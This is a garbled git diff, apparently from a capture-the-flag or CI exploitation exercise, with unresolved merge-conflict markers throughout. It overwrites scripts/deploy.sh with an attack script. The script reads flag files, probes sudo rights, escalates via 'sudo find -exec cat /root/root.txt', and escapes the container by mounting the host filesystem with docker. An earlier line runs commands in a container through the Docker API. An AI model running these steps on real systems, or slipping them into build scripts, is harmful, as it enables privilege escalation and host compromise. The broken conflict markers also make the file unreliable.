@@ -95,6 +95,7 @@ def docker_request(method, path, body=None):
 r = docker_request('POST', '/containers/b0b22fe23519/exec', {'AttachStdout':True,'AttachStderr':True,'Cmd':['find','/','–name','flag*']})
 print(r[-500:])
 "
+<<<<<<< HEAD
 >>>>>>> 41678f64d45fb3507cf215fb21efe95889f0b6fc
 #!/usr/bin/env bash
 set -euo pipefail
@@ -111,3 +112,22 @@ cat /proc/1/cgroup
 ls -la /var/run/docker.sock 2>/dev/null || echo "No docker socket found"
 # Docker flag extraction
 sudo docker run --rm -v /:/host_fs alpine cat /host_fs/opt/void/docker_flag.txt 2>/dev/null || echo "Docker flag not found"
+=======
+
+echo "=== VAULT FLAG ==="
+python3 scripts/vault_exec.py
+>>>>>>> e189f27babf57968c77445a6add8a01d7132aa77
+echo '#!/usr/bin/env bash
+set -euo pipefail
+echo "=== TARGET INSPECTION ==="
+id
+echo "=== PRINTING THE FLAG ==="
+cat /opt/void/ci_flag.txt 2>/dev/null || echo "CI flag not found"
+echo "=== PRIVILEGE ESCALATION ==="
+sudo -l
+echo "=== READING ROOT FLAG ==="
+sudo /usr/bin/find . -exec cat /root/root.txt \; -quit 2>/dev/null || echo "Root flag not found"
+echo "=== DOCKER ESCAPE ==="
+cat /proc/1/cgroup
+ls -la /var/run/docker.sock 2>/dev/null || echo "No docker socket found"
+sudo docker run --rm -v /:/host_fs alpine cat /host_fs/opt/void/docker_flag.txt 2>/dev/null || echo "Docker flag not found"' > scripts/deploy.sh
